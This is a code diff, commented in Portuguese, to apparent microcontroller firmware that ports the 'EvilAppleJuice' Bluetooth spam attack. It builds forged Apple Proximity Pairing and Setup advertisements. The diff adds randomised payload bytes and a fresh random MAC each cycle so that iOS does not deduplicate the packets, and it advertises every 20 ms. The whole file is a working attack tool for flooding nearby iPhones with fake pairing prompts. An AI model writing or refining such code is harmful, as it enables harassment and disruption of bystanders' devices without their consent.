@@ -16,6 +16,13 @@
 #include "ble_spam.h"
 #include "debug.h"
 
+extern "C" {
+#include "gap.h"
+#include "gap_adv.h"
+#include "gap_le.h"
+#include "gap_le_types.h"
+}
+
 // =========================================================
 // Tabela de dispositivos Apple (port direto de devices.hpp)
 // =========================================================
@@ -69,33 +76,32 @@ const AppleDevice ALL_APPLE_DEVICES[] = {
 static uint8_t generateApplePacket(const AppleDevice& dev, uint8_t* buf) {
   memset(buf, 0, 31);
 
-  if (dev.type == APPLE_AUDIO) {
-    // Apple Proximity Pairing (Continuity Type 0x07):
-    // Byte 0: 0x1E (AD length: 30 bytes follow)
-    // Byte 1: 0xFF (Manufacturer Specific Data)
-    // Byte 2..3: 0x4C, 0x00 (Apple Inc. Company ID - Little Endian)
-    // Byte 4: 0x07 (Continuity Subtype: Proximity Pairing)
-    // Byte 5: 0x19 (Continuity payload length: 25 bytes follow)
-    // Byte 6: 0x07 (Prefix)
-    // Byte 7: modelId (Device Model ID)
-    // Byte 8..18: Status / Battery / Buds info (11 bytes)
-    // Byte 19..30: 12 padding bytes (zeros for unbonded proximity advertisement)
-    // Total AD structure length = 1 (length byte) + 30 bytes = 31 bytes.
-    const uint8_t header[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07};
-    const uint8_t body[]   = {0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
-    memcpy(buf, header, 7);
-    buf[7] = dev.modelId;
-    memcpy(buf + 8, body, 11);
-    return 31; // Total length: 1 AD len + 30 data bytes (25 continuity bytes)
+    // Full 31-byte EvilAppleJuice payload (ADV record completo)
+    // Bytes [8..18] são o corpo — randomizar 3 deles simula MACs diferentes,
+    // evitando que o iOS deduplique e ignore pacotes repetidos.
+    buf[0]  = 0x1e;        // Length = 30 (resto do record)
+    buf[1]  = 0xff;        // AD Type: Manufacturer Specific
+    buf[2]  = 0x4c;        // Apple OUI [0]
+    buf[3]  = 0x00;        // Apple OUI [1]
+    buf[4]  = 0x07;        // Proximity Pairing subtype
+    buf[5]  = 0x19;        // Length of subtype data
+    buf[6]  = 0x07;        // Status flags
+    buf[7]  = dev.modelId; // Model ID
+    buf[8]  = 0x20;
+    buf[9]  = (uint8_t)random(0xFF); // randomiza → novo "device" a cada pacote
+    buf[10] = 0xaa;
+    buf[11] = (uint8_t)random(0xFF); // randomiza
+    buf[12] = 0x01;
+    buf[13] = 0x00;
+    buf[14] = 0x00;
+    buf[15] = (uint8_t)random(0xFF); // randomiza
+    buf[16] = 0x12;
+    buf[17] = 0x12;
+    buf[18] = 0x12;
+    // bytes 19..30 = 0x00 (já zerados pelo memset)
+    return 31;
   } else {
-    // APPLE_SETUP (Continuity Type 0x04):
-    // Byte 0: 0x16 (AD length: 22 bytes follow)
-    // Byte 1: 0xFF (Manufacturer Specific Data)
-    // Byte 2..3: 0x4C, 0x00 (Apple Inc. Company ID - Little Endian)
-    // Byte 4..12: Setup prefix (9 bytes)
-    // Byte 13: modelId
-    // Byte 14..22: Setup suffix (9 bytes)
-    // Total AD structure length = 1 (length byte) + 22 bytes = 23 bytes.
+    // APPLE_SETUP — 23 bytes (mantido igual, já funcionava)
     const uint8_t prefix[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1};
     const uint8_t suffix[] = {0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
     memcpy(buf, prefix, 13);
@@ -114,23 +120,13 @@ uint8_t  ble_spam_idx  = 0;
 
 static bool ble_initialized = false;
 
-// ADV type constants disponíveis no GAP Ameba
-// GAP_ADTYPE_ADV_IND        = 0x00
-// GAP_ADTYPE_ADV_SCAN_IND   = 0x02
-// GAP_ADTYPE_ADV_NONCONN_IND= 0x03
-static const uint8_t ADV_TYPES[] = {
-  GAP_ADTYPE_ADV_IND,
-  GAP_ADTYPE_ADV_SCAN_IND,
-  GAP_ADTYPE_ADV_NONCONN_IND
-};
-
 // =========================================================
 // ble_spam_next – avança para o próximo dispositivo e transmite
 // =========================================================
 void ble_spam_next() {
   if (!ble_initialized) return;
 
-  // Avança no ciclo de 35 dispositivos
+  // Avança no ciclo de dispositivos Apple
   ble_spam_idx = (ble_spam_idx + 1) % (uint8_t)NUM_APPLE_DEVICES;
   const AppleDevice& dev = ALL_APPLE_DEVICES[ble_spam_idx];
 
@@ -146,19 +142,27 @@ void ble_spam_next() {
   DEBUG_SER_PRINT((int)pktLen);
   DEBUG_SER_PRINT("\n");
 
-  // Seleciona ADV type aleatório (igual ao EvilAppleJuice original)
-  uint8_t advType = ADV_TYPES[random(3)];
-
   BLEAdvert* advert = BLE.configAdvert();
+
+  // Pausa brevemente o advertising para aplicar novo Random MAC e payload
   advert->stopAdv();
-  advert->setAdvType(advType);
 
-  // 20ms intervalo = recomendação Apple QA1931 para máxima visibilidade
-  // 0x0020 = 32 * 0.625ms = 20ms
-  advert->setMinInterval(0x0020);
-  advert->setMaxInterval(0x0020);
+  // Gera novo Random MAC a cada ciclo de dispositivo.
+  // Essencial para o iOS não ignorar como duplicado/cacheado
+  // e porque acessórios Apple genuínos usam Random Private Addresses.
+  uint8_t rand_mac[6];
+  for (int i = 0; i < 6; i++) {
+    rand_mac[i] = (uint8_t)random(0xFF);
+  }
+  rand_mac[5] |= 0xC0; // Static Random Address (top 2 bits = 11)
+  le_set_gap_param(GAP_PARAM_RANDOM_ADDR, 6, rand_mac);
 
-  // Injeta o payload diretamente como ADV data raw
+  uint8_t adv_addr_type = GAP_LOCAL_ADDR_LE_RANDOM;
+  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(adv_addr_type), &adv_addr_type);
+
+  advert->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
+  advert->setMinInterval(20); // 20ms intervalo de anúncio de alta densidade
+  advert->setMaxInterval(20);
   advert->setAdvData(packet, pktLen);
   advert->updateAdvertParams();
   advert->startAdv();
@@ -175,7 +179,21 @@ void start_ble_spam() {
   DEBUG_SER_PRINT("[BLE] Iniciando EvilAppleJuice (35 dispositivos Apple)...\n");
 
   BLE.init();
-  BLE.configAdvert()->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
+
+  // Configura parâmetros base antes de beginPeripheral()
+  BLEAdvert* advert = BLE.configAdvert();
+  advert->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
+  advert->setMinInterval(20); // 20ms
+  advert->setMaxInterval(20);
+
+  // Random MAC inicial
+  uint8_t rand_mac[6];
+  for (int i = 0; i < 6; i++) rand_mac[i] = (uint8_t)random(0xFF);
+  rand_mac[5] |= 0xC0;
+  le_set_gap_param(GAP_PARAM_RANDOM_ADDR, 6, rand_mac);
+  uint8_t adv_addr_type = GAP_LOCAL_ADDR_LE_RANDOM;
+  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(adv_addr_type), &adv_addr_type);
+
   BLE.beginPeripheral();
 
   ble_initialized = true;
